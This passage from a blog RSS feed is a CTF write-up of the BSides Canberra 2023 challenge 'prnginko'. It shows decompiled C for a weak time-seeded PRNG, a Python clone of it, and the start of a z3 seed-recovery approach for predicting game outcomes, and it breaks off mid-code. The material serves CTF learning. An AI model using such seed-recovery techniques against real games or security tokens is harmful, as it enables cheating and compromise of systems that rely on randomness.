<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTF Writeups on teddyctf</title>
    <link>https://TheSavageTeddy.github.io/categories/ctf-writeups/</link>
    <description>Recent content in CTF Writeups on teddyctf</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>teddyctf</copyright>
    <lastBuildDate>Mon, 01 Apr 2024 06:43:20 +0800</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/categories/ctf-writeups/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Reversing Writeups - BSides Canberra CTF 2023</title>
      <link>https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2023/</link>
      <pubDate>Sun, 01 Oct 2023 00:06:40 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2023/</guid>
      <description>Overview During the school holidays, I had the opportunity to attend BSides Canberra 2023, which was a 3 day conference held near the end of September, in the National Convention Center Canberra.
Along with many great talks, it featured three &amp;lsquo;villages&amp;rsquo; including hardware, lockpicking and wireless. With 3000 people attending, this was the largest hacking conference that I had gone to, and it was a lot of fun!
Cybears hosted this year&amp;rsquo;s CTF event with unique comic style graphics for the CTF site.</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;During the school holidays, I had the opportunity to attend BSides Canberra 2023, which was a 3 day conference held near the end of September, in the National Convention Center Canberra.&lt;/p&gt;
&lt;p&gt;Along with many great talks, it featured three &amp;lsquo;villages&amp;rsquo; including hardware, lockpicking and wireless. With 3000 people attending, this was the largest hacking conference that I had gone to, and it was a lot of fun!&lt;/p&gt;

  &lt;img src=&#34;./img/ctfing.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;&lt;a href=&#34;https://twitter.com/cybearsCTF&#34;&gt;Cybears&lt;/a&gt; hosted this year&amp;rsquo;s CTF event with unique comic style graphics for the CTF site. They had some great challenges, and the competition hall was packed with 193 teams participating!&lt;/p&gt;
&lt;p&gt;I played with &lt;a href=&#34;https://twitter.com/EmuExploit&#34;&gt;&lt;code&gt;Emu Exploit&lt;/code&gt;&lt;/a&gt; and overall we came 3rd in the CTF, and recieved a massive cardboard cheque of $250 and a medal - congrats to &lt;code&gt;skateboarding roomba&lt;/code&gt; and &lt;code&gt;Grassroots Indirection&lt;/code&gt; on 1st and 2nd!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;In this blog post, I will provide an in-depth walkthough to &lt;code&gt;prnginko&lt;/code&gt;, a crypto/rev challenge which caused me a lot of pain, and a brief writeup of &lt;code&gt;useless&lt;/code&gt;, another rev challenge.&lt;/p&gt;
&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
&lt;p&gt;I will mainly focus on &lt;code&gt;prnginko&lt;/code&gt;, as I want to detail the many roadblocks we faced along the way, instead of going straight to the solution.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#prnginko-cryptorev---8-solves&#34;&gt;prnginko&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto/rev&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#useless-rev---9-solves&#34;&gt;useless&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;rev&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;If you want to follow along or see the binary for yourself, download files here&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;./files/prnginko&#34;&gt;&lt;code&gt;prnginko&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./files/useless&#34;&gt;&lt;code&gt;useless&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;prnginko-cryptorev---8-solves&#34;&gt;prnginko (crypto/rev) - 8 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Multi-bet with SportsBear!&lt;/p&gt;
&lt;p&gt;nc prnginko.chal.cybears.io 2323&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a binary &lt;a href=&#34;./files/prnginko&#34;&gt;&lt;code&gt;prnginko&lt;/code&gt;&lt;/a&gt; and a service to connect to. Upon running the binary, we are presented with the game and a message suggesting the goal to be getting a &amp;ldquo;perfect game&amp;rdquo;. The game includes a board consisting of pins and a ball which randomly bounces either left or right when it hits a pin, similar to the Plinko game.&lt;/p&gt;

  &lt;img src=&#34;./img/game_ex.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;We have two options - &lt;code&gt;g&lt;/code&gt; to play a game and earn points, or &lt;code&gt;p&lt;/code&gt; to practice. We can play 10 games in total and need to get the maximum score of &lt;code&gt;16&lt;/code&gt; each time to win.&lt;/p&gt;
&lt;p&gt;&amp;ldquo;prng&amp;rdquo; in the challenge name suggests that we need to reverse engineer the program to find the PRNG it uses to determine if the ball will go left or right, and crack it to find what future game plays will yield. Then, by being able to predict the future, we can &lt;strong&gt;use the practice games to re-roll the PRNG&lt;/strong&gt; until we know the next game will yield a max score of 16, and then use one of our game rounds.&lt;/p&gt;
&lt;p&gt;A quick explanation of why we can do this - PRNGs (pseudo random number generator) usually use a &lt;em&gt;seed&lt;/em&gt; and some other parameters to generate the next &amp;ldquo;random&amp;rdquo; number using some math. If the same seed and same parameters are used, then the next random number it generates will be the same. Thus, if we are able to recover the seed and know the parameters, we can predict the values it will generate in the future.&lt;/p&gt;
&lt;p&gt;Hopping into &lt;a href=&#34;https://hex-rays.com/ida-free/&#34;&gt;IDA&lt;/a&gt;, we can see the &lt;code&gt;160&lt;/code&gt; points required to win, which is getting &lt;code&gt;16&lt;/code&gt; points ten times - a perfect game.&lt;/p&gt;

  &lt;img src=&#34;./img/ida_1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;Note that function and variable names were stripped in the binary, so we had to go through and rename everything relevant as always.&lt;/p&gt;
&lt;p&gt;After some reverse engineering, we find a few functions that together form a PRNG based on the program&amp;rsquo;s current runtime.&lt;/p&gt;
&lt;p&gt;There are three functions:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;get_timeseed()&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Is only called once, at the start of the program&lt;/li&gt;
&lt;li&gt;Gets a value affected by time using &lt;code&gt;clock_gettime()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Sets &lt;code&gt;time_seed&lt;/code&gt; to the amount of seconds, plus &lt;code&gt;1000000000&lt;/code&gt; times the amount of &lt;strong&gt;nanoseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_timeseed&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; timespec tp; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-20h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+28h] [rbp-8h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__readfsqword&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;clock_gettime&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tp) )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4294967293LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  time_seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LODWORD&lt;/span&gt;(tp.tv_sec) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000000000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LODWORD&lt;/span&gt;(tp.tv_nsec);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;prng_subpart()&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Does some math with &lt;code&gt;a_value&lt;/code&gt; and &lt;code&gt;time_seed&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Changes &lt;code&gt;a_value&lt;/code&gt; (&lt;code&gt;HIDWORD&lt;/code&gt; gets the higher 32 bits, same as shifting right by 32 bits) and &lt;code&gt;time_seed&lt;/code&gt; based on the math calculation&lt;/li&gt;
&lt;li&gt;Returns the result of the math calculation&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a_value&lt;/code&gt; is set to &lt;code&gt;1&lt;/code&gt; at the start of the program&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prng_subpart&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; var8; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp+0h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;var8 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)a_value &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5D8A3FF84711ALL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)time_seed;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a_value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HIDWORD&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;var8 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  time_seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;var8 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)time_seed;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;prng_main()&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;prng_main()&lt;/code&gt; calls &lt;code&gt;prng_subpart()&lt;/code&gt; only when &lt;code&gt;shift_r_value&lt;/code&gt; is below zero&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shift_r_value&lt;/code&gt; is the amount that the &lt;code&gt;prng_output&lt;/code&gt; is right shifted&lt;/li&gt;
&lt;li&gt;The function returns the lowest bit of &lt;code&gt;prng_output &amp;gt;&amp;gt; shift_r_value&lt;/code&gt; (using &lt;code&gt;&amp;amp; 1&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shift_r_value&lt;/code&gt; is initialized to &lt;code&gt;-1&lt;/code&gt; at the start, so &lt;code&gt;prng_output&lt;/code&gt; is called at the start&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prng_main&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( shift_r_value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    shift_r_value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    prng_output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prng_subpart&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)prng_output &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; shift_r_value&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As global variables, the initial values of &lt;code&gt;shift_r_value&lt;/code&gt; and &lt;code&gt;a_value&lt;/code&gt; were located in the &lt;code&gt;.data&lt;/code&gt; section, or just double click in IDA to find them.&lt;/p&gt;
&lt;p&gt;The main takeaway from these functions is that we know all of the values, &lt;strong&gt;except &lt;code&gt;time_seed&lt;/code&gt;&lt;/strong&gt;. &lt;code&gt;time_seed&lt;/code&gt; is the only value that is causing the output to not be identical - it&amp;rsquo;s the only value that changes &amp;ldquo;randomly&amp;rdquo; each time we run the program, so we need a way to recover it.&lt;/p&gt;
&lt;p&gt;Of course it is a horrible idea to seed a PRNG based on time, but it uses nanosecond precision which we cannot accurately predict on a remote instance.&lt;/p&gt;
&lt;p&gt;However, if we &lt;em&gt;did&lt;/em&gt; know the value of &lt;code&gt;time_seed&lt;/code&gt;, that&amp;rsquo;s all that&amp;rsquo;s left to input into our own PRNG and predict the future!&lt;/p&gt;
&lt;p&gt;To start off simple, let&amp;rsquo;s write out the PRNG functions in Python.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;prng.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
def get_timeseed():
    # we&amp;#39;ll figure out how to get this later ;)
    timeseed = int(input(&amp;#34;Enter timeseed: &amp;#34;))
    return timeseed

def prng_subpart():
    global time_seed, a_value

    output = a_value - 0xC5D8A3FF84711A * time_seed
    a_value = output &amp;gt;&amp;gt; 32
    time_seed = output
    return time_seed

def prng_main():
    global shift_r_value, prng_output

    if shift_r_value &amp;lt; 0:
        shift_r_value = 31
        prng_output = prng_subpart()
    output = (prng_output &amp;gt;&amp;gt; shift_r_value) &amp;amp; 1
    shift_r_value -= 1
    return output

prng_output = None
shift_r_value = -1
a_value = 1
time_seed = get_timeseed()

for i in range(8):
    print(f&amp;#34;Value of output {i}: {prng_main()}&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;But how do we know this is correct? (foreshadowing: it&amp;rsquo;s not quite&amp;hellip;)&lt;/p&gt;
&lt;p&gt;In IDA we can see &lt;code&gt;time_seed&lt;/code&gt; is stored in &lt;code&gt;.bss&lt;/code&gt;, so let&amp;rsquo;s test our PRNG replication by debugging and just grabbing the value directly.&lt;/p&gt;
&lt;p&gt;Using &lt;code&gt;info file&lt;/code&gt; to locate address of &lt;code&gt;.bss&lt;/code&gt;, we dump &lt;code&gt;.bss&lt;/code&gt; to find &lt;code&gt;time_seed&lt;/code&gt;, which as an &lt;code&gt;unsigned int&lt;/code&gt; is a 4 byte value at offset &lt;code&gt;0x44&lt;/code&gt;, same as what IDA shows.&lt;/p&gt;

  &lt;img src=&#34;./img/prng_2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;Next, we chuck this &lt;code&gt;time_seed&lt;/code&gt; value into our own PRNG and see if our outputs correlates with the game&amp;rsquo;s outputs.&lt;/p&gt;

  &lt;img src=&#34;./img/prng_work.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;It indeed does! &lt;code&gt;0&lt;/code&gt; indicates that the ball goes left, and &lt;code&gt;1&lt;/code&gt; indicates the ball goes right.&lt;/p&gt;
&lt;h4 id=&#34;a-roadblock&#34;&gt;A Roadblock&lt;/h4&gt;
&lt;p&gt;However, there is one flaw I would like to point out here - &lt;strong&gt;there is a mistake in our Python PRNG&lt;/strong&gt;. This subtle mistake cost hours of debugging and pain - I said that I would eat breakfast after solving the challenge. I ended up eating lunch instead.&lt;/p&gt;
&lt;p&gt;You may wonder, well, the PRNG seems to be giving the correct output though? It predicted 8 values correctly. That is true, until you go after 64 values.&lt;/p&gt;
&lt;p&gt;It turns out that &lt;strong&gt;we forgot to account for the C datatypes in python&lt;/strong&gt;! &lt;code&gt;output&lt;/code&gt; (&lt;code&gt;var8&lt;/code&gt;) is an &lt;code&gt;int64&lt;/code&gt;, which means if we go over &lt;code&gt;2**63&lt;/code&gt; or under &lt;code&gt;-2**63&lt;/code&gt;, it will wrap around, same as &lt;code&gt;mod 2**64&lt;/code&gt;. We didn&amp;rsquo;t account for this - thus eventually after two outputs of &lt;code&gt;prng_subpart&lt;/code&gt;, &lt;code&gt;time_seed&lt;/code&gt; became large enough to surpass this limit and provide incorrect outputs.&lt;/p&gt;
&lt;p&gt;To account for this we will add &lt;code&gt;output = output % (2**64)&lt;/code&gt; and &lt;code&gt;time_seed = output % (2**32)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The fixed code is now:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;prng.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
def get_timeseed():
    # we&amp;#39;ll figure out how to get this later ;)
    timeseed = int(input(&amp;#34;Enter timeseed: &amp;#34;))
    
    return timeseed

def prng_subpart():
    global time_seed, a_value

    output = a_value - 0xC5D8A3FF84711A * time_seed
    output = output % (2**64)
    a_value = output &amp;gt;&amp;gt; 32
    time_seed = output % (2**32)
    return time_seed

def prng_main():
    global shift_r_value, prng_output

    if shift_r_value &amp;lt; 0:
        shift_r_value = 31
        prng_output = prng_subpart()
    output = (prng_output &amp;gt;&amp;gt; shift_r_value) &amp;amp; 1
    shift_r_value -= 1
    return output

prng_output = None
shift_r_value = -1
a_value = 1
time_seed = get_timeseed()

for _ in range(10):
    for i in range(8):
        print(f&amp;#34;Value of output {i}: {prng_main()}&amp;#34;)
    print()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h4 id=&#34;back-to-the-challenge&#34;&gt;Back to the challenge&amp;hellip;&lt;/h4&gt;
&lt;p&gt;With that issue fixed, we can continue on with the challenge.&lt;/p&gt;
&lt;p&gt;We have successfully recreated the PRNG and can predict future outputs given &lt;code&gt;time_seed&lt;/code&gt;, now only one problem remains - how can we retrieve the value of &lt;code&gt;time_seed&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;As mentioned before, &lt;code&gt;time_seed&lt;/code&gt; is affected by time in nanoseconds, which would be close to impossible to simulate on a remote connection.&lt;/p&gt;
&lt;p&gt;Another idea is to brute force. As it is a &lt;code&gt;unsigned int32&lt;/code&gt;, we can try &lt;code&gt;2**32&lt;/code&gt; possible values for &lt;code&gt;time_seed&lt;/code&gt;, until our PRNG output seems to match up with the game&amp;rsquo;s output. However, this is also not possible since although &lt;code&gt;2**32&lt;/code&gt; is not too large, there is a timer set for 5 minutes, and with a quick test it would take way too long to brute force in under 5 minutes (at least in python).&lt;/p&gt;

  &lt;img src=&#34;./img/alarm.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;Our last option is to use an SMT solver, such as &lt;a href=&#34;https://github.com/Z3Prover/z3&#34;&gt;z3&lt;/a&gt;. We can simply get a bunch of outputs from the game, then tell z3 that it should try to find a value of &lt;code&gt;time_seed&lt;/code&gt; that causes our PRNG to output the same as the game.&lt;/p&gt;
&lt;p&gt;For example, if a round of our game outputs &lt;code&gt;LRRLRLLL&lt;/code&gt; where &lt;code&gt;L&lt;/code&gt; is left and &lt;code&gt;R&lt;/code&gt; is right, we can change it to &lt;code&gt;01101000&lt;/code&gt;, and tell z3 that the first output of our PRNG should be &lt;code&gt;0&lt;/code&gt;, the second should be &lt;code&gt;1&lt;/code&gt;, and so on.&lt;/p&gt;
&lt;p&gt;First, we define &lt;code&gt;time_seed&lt;/code&gt; as a &lt;strong&gt;64-bit&lt;/strong&gt; value.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time_seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;time_seed&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But wait - why should it be 64-bits when we know it is actually a 32-bit value?&lt;/p&gt;
&lt;p&gt;Well, if we look at the decompilation again, we can see &lt;code&gt;time_seed&lt;/code&gt; is being set to &lt;code&gt;var8&lt;/code&gt;, and &lt;code&gt;var8&lt;/code&gt; is 64 bits. This means that the first calculation can result in a 64 bit value, causing time_seed to be set to a value larger than 64 bits.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prng_subpart&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
